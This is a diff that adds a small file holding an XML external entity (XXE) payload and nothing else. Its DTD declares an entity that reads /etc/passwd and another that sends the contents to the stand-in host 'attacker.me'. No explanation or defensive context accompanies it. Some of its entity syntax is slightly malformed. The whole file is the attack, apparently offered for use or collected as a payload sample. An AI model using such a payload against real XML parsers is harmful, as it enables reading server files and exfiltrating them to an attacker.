@@ -1,0 +1,10 @@
+<!DOCTYPE lfi [   
+<!ELEMENT lfi ANY>   
+<!ENTITY % boo SYSTEM   
+"file:///etc/passwd"> 
+<!ENTITY xxe SYSTEM "http://attacker.me/?info=%boo">
+]> 
+
+<lfi>   
+&boo; 
+</lfi>
